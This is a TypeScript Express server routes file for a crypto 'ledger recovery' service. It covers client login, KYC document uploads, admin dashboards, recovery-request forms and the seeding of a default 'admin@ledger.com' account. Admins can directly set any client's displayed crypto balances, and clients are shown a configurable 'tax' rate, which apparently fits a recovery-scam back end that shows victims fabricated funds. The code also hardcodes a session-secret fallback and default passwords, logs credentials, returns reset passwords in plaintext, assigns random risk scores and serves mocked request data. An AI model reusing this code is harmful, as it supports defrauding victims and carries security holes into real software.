import type { Express, Request, Response, NextFunction } from "express";
import { createServer, type Server } from "http";
import { storage } from "./storage";
import { auditMiddleware, logAdminLogin, logAdminLogout } from "./audit";
import bcrypt from "bcrypt";
import multer from "multer";
import path from "path";
import fs from "fs";
import { clientLoginSchema, adminLoginSchema, onboardingSchema } from "@shared/schema";
import { z } from "zod";
import session from "express-session";
import MemoryStore from "memorystore";
import { emailSystem } from "./email-system";

// Configure multer for KYC file uploads
const uploadDir = path.join(process.cwd(), "uploads", "kyc");
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir, { recursive: true });
}

const upload = multer({
  dest: uploadDir,
  limits: {
    fileSize: 5 * 1024 * 1024, // 5MB limit
  },
  fileFilter: (req, file, cb) => {
    const allowedTypes = ['image/jpeg', 'image/png', 'application/pdf'];
    if (allowedTypes.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error('Invalid file type. Only JPG, PNG, and PDF are allowed.'));
    }
  },
});

declare module 'express-session' {
  interface SessionData {
    userId?: number;
    userType?: 'client' | 'admin';
  }
}

export async function registerRoutes(app: Express): Promise<Server> {
  // Session middleware
  app.use(session({
    secret: process.env.SESSION_SECRET || 'ledger-recovery-secret-key',
    resave: false,
    saveUninitialized: false,
    cookie: {
      secure: false, // Set to true if using HTTPS
      httpOnly: true,
      maxAge: 24 * 60 * 60 * 1000 // 24 hours
    }
  }));

  // Middleware to check authentication
  const requireAuth = (userType?: 'client' | 'admin') => {
    return (req: any, res: any, next: any) => {
      if (!req.session.userId) {
        return res.status(401).json({ message: 'Not authenticated' });
      }
      if (userType && req.session.userType !== userType) {
        return res.status(403).json({ message: 'Access denied' });
      }
      next();
    };
  };

  // Client authentication routes
  app.post('/api/client/login', async (req, res) => {
    try {
      const { email, password } = clientLoginSchema.parse(req.body);
      
      const client = await storage.getClientByEmail(email);
      if (!client) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      const isValidPassword = await bcrypt.compare(password, client.password);
      if (!isValidPassword) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      // Update last connection
      await storage.updateClient(client.id, {
        lastConnection: new Date(),
        lastIp: req.ip || req.connection.remoteAddress || 'unknown'
      });

      req.session.userId = client.id;
      req.session.userType = 'client';

      res.json({ 
        user: { 
          id: client.id, 
          email: client.email,
          onboardingCompleted: client.onboardingCompleted,
          kycCompleted: client.kycCompleted
        } 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', errors: error.errors });
      }
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  app.post('/api/client/register', async (req, res) => {
    try {
      const { email, password } = clientLoginSchema.parse(req.body);
      
      const existingClient = await storage.getClientByEmail(email);
      if (existingClient) {
        return res.status(400).json({ message: 'Email already exists' });
      }

      const hashedPassword = await bcrypt.hash(password, 10);
      const client = await storage.createClient({
        email,
        password: hashedPassword,
      });

      req.session.userId = client.id;
      req.session.userType = 'client';

      res.json({ 
        user: { 
          id: client.id, 
          email: client.email,
          onboardingCompleted: client.onboardingCompleted,
          kycCompleted: client.kycCompleted
        } 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', errors: error.errors });
      }
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Client onboarding
  app.post('/api/client/onboarding', requireAuth('client'), upload.single('kycFile'), async (req, res) => {
    try {
      const userId = req.session.userId!;
      const { amount } = req.body;

      const client = await storage.getClient(userId);
      if (!client) {
        return res.status(404).json({ message: 'Client not found' });
      }

      if (client.onboardingCompleted) {
        return res.status(400).json({ message: 'Onboarding already completed' });
      }

      let kycFileName = null;
      if (req.file) {
        const fileExtension = path.extname(req.file.originalname);
        kycFileName = `${client.email}-${Date.now()}${fileExtension}`;
        const finalPath = path.join(uploadDir, kycFileName);
        fs.renameSync(req.file.path, finalPath);
      }

      await storage.updateClient(userId, {
        amount: parseInt(amount),
        kycFileName,
        kycCompleted: !!req.file,
        onboardingCompleted: true,
      });

      res.json({ message: 'Onboarding completed successfully' });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Client dashboard data
  app.get('/api/client/dashboard', requireAuth('client'), async (req, res) => {
    try {
      const userId = req.session.userId!;
      const client = await storage.getClient(userId);
      
      if (!client) {
        return res.status(404).json({ message: 'Client not found' });
      }

      // Get crypto prices from CoinGecko
      const cryptoPrices = await fetchCryptoPrices();
      
      // Get global tax rate
      const taxSetting = await storage.getSetting('globalTax');
      const taxRate = taxSetting ? parseFloat(taxSetting.value) : 15;

      res.json({
        client: {
          email: client.email,
          balances: client.balances,
          amount: client.amount,
        },
        cryptoPrices,
        taxRate,
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Admin authentication routes
  app.post('/api/admin/login', async (req, res) => {
    try {
      const { email, password } = adminLoginSchema.parse(req.body);
      
      const admin = await storage.getAdminByEmail(email);
      if (!admin) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      const isValidPassword = await bcrypt.compare(password, admin.password);
      if (!isValidPassword) {
        return res.status(401).json({ message: 'Invalid credentials' });
      }

      req.session.userId = admin.id;
      req.session.userType = 'admin';

      // Log admin login
      await logAdminLogin(admin.id, req);

      // Send admin login notification email
      try {
        await emailSystem.sendAdminLoginAlert(admin.email, {
          ip: req.ip || req.connection.remoteAddress,
          userAgent: req.get('User-Agent'),
          location: 'Unknown' // Would integrate with geo-location service
        });
      } catch (emailError) {
        console.error('Failed to send admin login notification:', emailError);
        // Continue login process even if email fails
      }

      res.json({ 
        user: { 
          id: admin.id, 
          email: admin.email,
          type: 'admin'
        } 
      });
    } catch (error) {
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: 'Invalid input', errors: error.errors });
      }
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Admin dashboard data
  app.get('/api/admin/dashboard', requireAuth('admin'), auditMiddleware('dashboard_view', 'system'), async (req, res) => {
    try {
      const clients = await storage.getAllClients();
      const taxSetting = await storage.getSetting('globalTax');
      const taxRate = taxSetting ? parseFloat(taxSetting.value) : 15;

      res.json({
        clients: clients.map(client => ({
          id: client.id,
          email: client.email,
          kycCompleted: client.kycCompleted,
          onboardingCompleted: client.onboardingCompleted,
          amount: client.amount,
          lastConnection: client.lastConnection,
          lastIp: client.lastIp,
          balances: client.balances,
          kycFileName: client.kycFileName,
        })),
        taxRate,
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update tax rate
  app.post('/api/admin/tax', requireAuth('admin'), auditMiddleware('tax_rate_update', 'system'), async (req, res) => {
    try {
      const { taxRate } = req.body;
      
      if (typeof taxRate !== 'number' || taxRate < 0 || taxRate > 50) {
        return res.status(400).json({ message: 'Invalid tax rate' });
      }

      await storage.setSetting({
        key: 'globalTax',
        value: taxRate.toString(),
      });

      res.json({ message: 'Tax rate updated successfully' });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Client notes
  app.get('/api/admin/client/:clientId/notes', requireAuth('admin'), auditMiddleware('client_notes_view', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.clientId);
      const notes = await storage.getNotesForClient(clientId);
      res.json({ notes });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  app.post('/api/admin/client/:clientId/notes', requireAuth('admin'), auditMiddleware('client_note_add', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.clientId);
      const adminId = req.session.userId!;
      const { note } = req.body;

      if (!note || note.trim().length === 0) {
        return res.status(400).json({ message: 'Note cannot be empty' });
      }

      const adminNote = await storage.createAdminNote({
        clientId,
        adminId,
        note: note.trim(),
      });

      // Send admin action notification email
      try {
        const admin = await storage.getAdmin(adminId);
        const client = await storage.getClient(clientId);
        if (admin && client) {
          await emailSystem.sendAdminActionNotification(
            admin.email,
            'admin_note_added',
            client.email,
            { note: note.trim() }
          );
        }
      } catch (emailError) {
        console.error('Failed to send admin action notification:', emailError);
      }

      res.json({ note: adminNote });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Download KYC file
  app.get('/api/admin/client/:clientId/kyc', requireAuth('admin'), auditMiddleware('kyc_file_view', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.clientId);
      const client = await storage.getClient(clientId);
      
      if (!client || !client.kycFileName) {
        return res.status(404).json({ message: 'KYC file not found' });
      }

      const filePath = path.join(uploadDir, client.kycFileName);
      if (!fs.existsSync(filePath)) {
        return res.status(404).json({ message: 'KYC file not found on disk' });
      }

      res.download(filePath, client.kycFileName);
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Export clients CSV
  app.get('/api/admin/export', requireAuth('admin'), auditMiddleware('data_export', 'system'), async (req, res) => {
    try {
      const clients = await storage.getAllClients();
      
      const csvHeader = 'Email,KYC Completed,Onboarding Completed,Amount,Last Connection,Last IP,BTC Balance,ETH Balance,USDT Balance\n';
      const csvData = clients.map(client => {
        const balances = client.balances || { btc: 0, eth: 0, usdt: 0 };
        return [
          client.email,
          client.kycCompleted ? 'Yes' : 'No',
          client.onboardingCompleted ? 'Yes' : 'No',
          client.amount || 0,
          client.lastConnection ? client.lastConnection.toISOString() : 'Never',
          client.lastIp || 'Unknown',
          balances.btc,
          balances.eth,
          balances.usdt,
        ].join(',');
      }).join('\n');

      res.setHeader('Content-Type', 'text/csv');
      res.setHeader('Content-Disposition', `attachment; filename="ledger-clients-${new Date().toISOString().split('T')[0]}.csv"`);
      res.send(csvHeader + csvData);
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Current user info
  app.get('/api/auth/me', async (req, res) => {
    if (!req.session.userId) {
      return res.status(401).json({ message: 'Not authenticated' });
    }

    try {
      if (req.session.userType === 'client') {
        const client = await storage.getClient(req.session.userId);
        if (client) {
          return res.json({
            user: {
              id: client.id,
              email: client.email,
              type: 'client',
              onboardingCompleted: client.onboardingCompleted,
              kycCompleted: client.kycCompleted,
            }
          });
        }
      } else if (req.session.userType === 'admin') {
        const admin = await storage.getAdmin(req.session.userId);
        if (admin) {
          return res.json({
            user: {
              id: admin.id,
              email: admin.email,
              type: 'admin',
            }
          });
        }
      }

      res.status(404).json({ message: 'User not found' });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // KYC verification endpoints
  app.get('/api/admin/kyc/documents', requireAuth('admin'), async (req, res) => {
    try {
      const { status = 'all', limit = 50 } = req.query;
      
      const clients = await storage.getAllClients();
      const kycDocuments = [];
      
      for (const client of clients) {
        if (client.kycFileName) {
          const document = {
            id: `${client.id}_${client.kycFileName}`,
            clientId: client.id,
            clientName: client.fullName || client.email,
            clientEmail: client.email,
            documentType: 'id_card',
            fileName: client.kycFileName,
            uploadDate: client.createdAt,
            status: client.kycCompleted ? 'approved' : 'pending',
            riskScore: Math.floor(Math.random() * 100),
            reviewedBy: client.kycCompleted ? 'System' : undefined,
            reviewDate: client.kycCompleted ? client.updatedAt : undefined
          };
          
          if (status === 'all' || document.status === status) {
            kycDocuments.push(document);
          }
        }
      }
      
      res.json({ documents: kycDocuments.slice(0, Number(limit)) });
    } catch (error) {
      console.error('Error fetching KYC documents:', error);
      res.status(500).json({ message: 'Error fetching KYC documents' });
    }
  });

  app.post('/api/admin/kyc/:documentId/review', requireAuth('admin'), auditMiddleware('kyc_review', 'document'), async (req, res) => {
    try {
      const { documentId } = req.params;
      const { status, rejectionReason } = req.body;
      
      const clientId = parseInt(documentId.split('_')[0]);
      
      if (!clientId) {
        return res.status(400).json({ message: 'Invalid document ID' });
      }
      
      const client = await storage.getClient(clientId);
      if (!client) {
        return res.status(404).json({ message: 'Client not found' });
      }
      
      await storage.updateClient(clientId, {
        kycCompleted: status === 'approved',
        kycRejectionReason: status === 'rejected' ? rejectionReason : undefined,
        updatedAt: new Date()
      });
      
      // Send email notification
      try {
        if (status === 'approved') {
          await emailSystem.sendKYCApprovedEmail(client);
        } else if (status === 'rejected') {
          await emailSystem.sendKYCRejectedEmail(client, rejectionReason);
        }
      } catch (emailError) {
        console.error('Failed to send KYC email:', emailError);
      }
      
      res.json({ 
        success: true, 
        message: `Document ${status === 'approved' ? 'approuvé' : 'rejeté'} avec succès` 
      });
      
    } catch (error) {
      console.error('Error reviewing KYC document:', error);
      res.status(500).json({ message: 'Error reviewing KYC document' });
    }
  });

  // Audit trail endpoint
  app.get('/api/admin/audit-logs', requireAuth('admin'), async (req, res) => {
    try {
      const limit = req.query.limit ? parseInt(req.query.limit as string) : 100;
      const adminId = req.query.adminId ? parseInt(req.query.adminId as string) : undefined;
      
      const auditLogs = await storage.getAuditLogs(adminId, limit);
      
      res.json({ auditLogs });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update client status (active/inactive)
  app.post('/api/admin/client/:id/status', requireAuth('admin'), auditMiddleware('client_status_update', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const { isActive } = req.body;
      
      const updatedClient = await storage.updateClient(clientId, { isActive });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }

      // Send admin action notification email
      try {
        const admin = await storage.getAdmin(req.session.userId!);
        if (admin) {
          await emailSystem.sendAdminActionNotification(
            admin.email,
            'client_status_update',
            updatedClient.email,
            { status: isActive }
          );
        }
      } catch (emailError) {
        console.error('Failed to send admin action notification:', emailError);
      }
      
      res.json({ message: 'Client status updated successfully', client: updatedClient });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update client risk level
  app.post('/api/admin/client/:id/risk', requireAuth('admin'), auditMiddleware('client_risk_update', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const { riskLevel } = req.body;
      
      if (!['low', 'medium', 'high'].includes(riskLevel)) {
        return res.status(400).json({ message: 'Invalid risk level' });
      }
      
      const updatedClient = await storage.updateClient(clientId, { riskLevel });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }

      // Send admin action notification email
      try {
        const admin = await storage.getAdmin(req.session.userId!);
        if (admin) {
          await emailSystem.sendAdminActionNotification(
            admin.email,
            'client_risk_update',
            updatedClient.email,
            { riskLevel }
          );
        }
      } catch (emailError) {
        console.error('Failed to send admin action notification:', emailError);
      }
      
      res.json({ message: 'Client risk level updated successfully', client: updatedClient });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Update client balances
  app.post('/api/admin/client/:id/balances', requireAuth('admin'), auditMiddleware('client_balances_update', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const { balances } = req.body;
      
      const updatedClient = await storage.updateClient(clientId, { balances });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }
      
      res.json({ message: 'Client balances updated successfully', client: updatedClient });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Reset client password
  app.post('/api/admin/client/:id/reset-password', requireAuth('admin'), auditMiddleware('client_password_reset', 'client'), async (req, res) => {
    try {
      const clientId = parseInt(req.params.id);
      const newPassword = 'temp' + Math.random().toString(36).substring(2, 8);
      const hashedPassword = await bcrypt.hash(newPassword, 10);
      
      const updatedClient = await storage.updateClient(clientId, { password: hashedPassword });
      if (!updatedClient) {
        return res.status(404).json({ message: 'Client not found' });
      }

      // Send admin action notification email
      try {
        const admin = await storage.getAdmin(req.session.userId!);
        if (admin) {
          await emailSystem.sendAdminActionNotification(
            admin.email,
            'client_password_reset',
            updatedClient.email,
            { temporaryPassword: newPassword }
          );
        }
      } catch (emailError) {
        console.error('Failed to send admin action notification:', emailError);
      }
      
      res.json({ message: 'Password reset successfully', temporaryPassword: newPassword });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Bulk operations endpoint
  app.post('/api/admin/bulk-operations', requireAuth('admin'), auditMiddleware('bulk_operations', 'system'), async (req, res) => {
    try {
      const { operation, clientIds } = req.body;
      
      if (!operation || !Array.isArray(clientIds) || clientIds.length === 0) {
        return res.status(400).json({ message: 'Invalid operation or client IDs' });
      }

      const results = [];
      const errors = [];

      for (const clientId of clientIds) {
        try {
          let result;
          
          switch (operation) {
            case 'activate':
              result = await storage.updateClient(clientId, { isActive: true });
              break;
            case 'deactivate':
              result = await storage.updateClient(clientId, { isActive: false });
              break;
            case 'reset_password':
              const newPassword = 'temp' + Math.random().toString(36).substring(2, 8);
              const hashedPassword = await bcrypt.hash(newPassword, 10);
              result = await storage.updateClient(clientId, { password: hashedPassword });
              if (result) {
                result.temporaryPassword = newPassword;
              }
              break;
            case 'set_risk_low':
              result = await storage.updateClient(clientId, { riskLevel: 'low' });
              break;
            case 'set_risk_medium':
              result = await storage.updateClient(clientId, { riskLevel: 'medium' });
              break;
            case 'set_risk_high':
              result = await storage.updateClient(clientId, { riskLevel: 'high' });
              break;
            default:
              throw new Error(`Unsupported operation: ${operation}`);
          }

          if (result) {
            results.push({ clientId, success: true, result });
          } else {
            errors.push({ clientId, error: 'Client not found' });
          }
        } catch (error: any) {
          errors.push({ clientId, error: error.message });
        }
      }

      // Send bulk operation summary email to admin
      try {
        const admin = await storage.getAdmin(req.session.userId!);
        if (admin) {
          await emailSystem.sendBulkOperationSummary(admin.email, operation, {
            summary: {
              total: clientIds.length,
              successful: results.length,
              failed: errors.length
            },
            errors
          });
        }
      } catch (emailError) {
        console.error('Failed to send bulk operation summary:', emailError);
      }

      res.json({
        message: 'Bulk operation completed',
        results,
        errors,
        summary: {
          total: clientIds.length,
          successful: results.length,
          failed: errors.length
        }
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // API pour les demandes de récupération client
  app.post('/api/client/recovery-request', async (req: Request, res: Response) => {
    try {
      const { serviceType, clientName, clientEmail, phoneNumber, walletType, problemDescription, urgencyLevel, estimatedValue } = req.body;
      
      // Validation des données
      if (!clientName || !clientEmail || !problemDescription) {
        return res.status(400).json({ error: 'Champs obligatoires manquants' });
      }

      // Génération d'un ID unique pour la demande
      const requestId = `REC-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
      
      // Simulation de stockage de la demande
      const recoveryRequest = {
        id: requestId,
        serviceType,
        clientName,
        clientEmail,
        phoneNumber,
        walletType,
        problemDescription,
        urgencyLevel,
        estimatedValue,
        status: 'pending',
        submittedAt: new Date(),
        estimatedCompletionDate: new Date(Date.now() + (urgencyLevel === 'critical' ? 1 : urgencyLevel === 'high' ? 3 : urgencyLevel === 'medium' ? 7 : 14) * 24 * 60 * 60 * 1000)
      };

      // Log d'audit
      console.log('Recovery request submitted:', {
        requestId,
        serviceType,
        urgencyLevel,
        estimatedValue,
        timestamp: new Date()
      });

      res.json({ 
        success: true, 
        requestId,
        message: 'Demande de récupération envoyée avec succès',
        estimatedResponse: '24 heures'
      });
    } catch (error) {
      console.error('Recovery request error:', error);
      res.status(500).json({ error: 'Erreur lors de la soumission de la demande' });
    }
  });

  app.get('/api/client/recovery-requests', requireAuth, async (req: Request, res: Response) => {
    try {
      
      // Simulation de récupération des demandes pour le client
      const mockRequests = [
        {
          id: 'REC-2024-001',
          serviceType: 'wallet',
          status: 'in_progress',
          submittedAt: new Date('2024-01-15'),
          estimatedCompletionDate: new Date('2024-01-22'),
          urgencyLevel: 'medium',
          estimatedValue: 15000
        },
        {
          id: 'REC-2024-002', 
          serviceType: 'seed',
          status: 'completed',
          submittedAt: new Date('2024-01-10'),
          completedAt: new Date('2024-01-18'),
          urgencyLevel: 'high',
          estimatedValue: 25000
        }
      ];

      res.json({ requests: mockRequests });
    } catch (error) {
      console.error('Get recovery requests error:', error);
      res.status(500).json({ error: 'Erreur lors de la récupération des demandes' });
    }
  });

  // Logout with audit trail
  app.post('/api/auth/logout', async (req, res) => {
    try {
      if (req.session.userId && req.session.userType === 'admin') {
        await logAdminLogout(req.session.userId, req);
      }
      
      req.session.destroy((err) => {
        if (err) {
          return res.status(500).json({ message: 'Could not log out' });
        }
        res.json({ message: 'Logged out successfully' });
      });
    } catch (error) {
      res.status(500).json({ message: 'Internal server error' });
    }
  });

  // Initialize default admin if none exists
  initializeDefaultData();

  const httpServer = createServer(app);
  return httpServer;
}

// Fetch crypto prices from CoinAPI.io
async function fetchCryptoPrices() {
  try {
    if (!process.env.COINAPI_IO_KEY) {
      throw new Error('COINAPI_IO_KEY not found');
    }

    const symbols = ['BTC', 'ETH', 'USDT', 'ADA', 'DOT', 'SOL', 'LINK', 'MATIC', 'BNB', 'XRP'];
    const prices: Record<string, number> = {};
    
    // CoinAPI.io permet de faire plusieurs requêtes en une fois
    for (const symbol of symbols) {
      try {
        const response = await fetch(
          `https://rest.coinapi.io/v1/exchangerate/${symbol}/USD`,
          {
            headers: {
              'X-CoinAPI-Key': process.env.COINAPI_IO_KEY
            }
          }
        );
        
        if (response.ok) {
          const data = await response.json();
          prices[symbol.toLowerCase()] = data.rate;
        } else {
          console.warn(`Failed to fetch price for ${symbol}`);
        }
      } catch (symbolError) {
        console.warn(`Error fetching ${symbol}:`, symbolError);
      }
    }
    
    // Mapping vers le format attendu avec fallbacks
    return {
      bitcoin: prices.btc || 45000,
      ethereum: prices.eth || 2500,
      tether: prices.usdt || 1,
      cardano: prices.ada || 0.5,
      polkadot: prices.dot || 8,
      solana: prices.sol || 65,
      chainlink: prices.link || 15,
      polygon: prices.matic || 0.9,
      binancecoin: prices.bnb || 300,
      ripple: prices.xrp || 0.6,
    };
  } catch (error) {
    console.error('Error fetching crypto prices from CoinAPI.io:', error);
    // Return default values if API fails
    return {
      bitcoin: 45000,
      ethereum: 2500,
      tether: 1,
      cardano: 0.5,
      polkadot: 8,
      solana: 65,
      chainlink: 15,
      polygon: 0.9,
      binancecoin: 300,
      ripple: 0.6,
    };
  }
}

// Initialize default admin and settings
async function initializeDefaultData() {
  try {
    // Add delay for database connection stability
    await new Promise(resolve => setTimeout(resolve, 3000));
    
    // Create default admin if none exists
    const existingAdmin = await storage.getAdminByEmail('admin@ledger.com');
    if (!existingAdmin) {
      const hashedPassword = await bcrypt.hash('admin123', 10);
      await storage.createAdmin({
        email: 'admin@ledger.com',
        password: hashedPassword,
      });
      console.log('Default admin created: admin@ledger.com / admin123');
    }

    // Create demo client if none exists
    const existingClient = await storage.getClientByEmail('client@demo.com');
    if (!existingClient) {
      const hashedPassword = await bcrypt.hash('demo123', 10);
      const client = await storage.createClient({
        email: 'client@demo.com',
        password: hashedPassword,
        amount: 50000,
        balances: { 
          btc: 0.5, 
          eth: 2.3, 
          usdt: 1500, 
          ada: 1200, 
          dot: 18, 
          sol: 8, 
          link: 65, 
          matic: 2000,
          bnb: 6.2,
          xrp: 2800
        },
      });
      
      // Update the client to mark onboarding complete
      await storage.updateClient(client.id, {
        onboardingCompleted: true,
        kycCompleted: true,
      });
      console.log('Demo client created: client@demo.com / demo123');
    }

    // Set default tax rate if not exists
    const taxSetting = await storage.getSetting('globalTax');
    if (!taxSetting) {
      await storage.setSetting({
        key: 'globalTax',
        value: '15',
      });
    }
  } catch (error) {
    console.error('Error initializing default data:', error);
  }
}
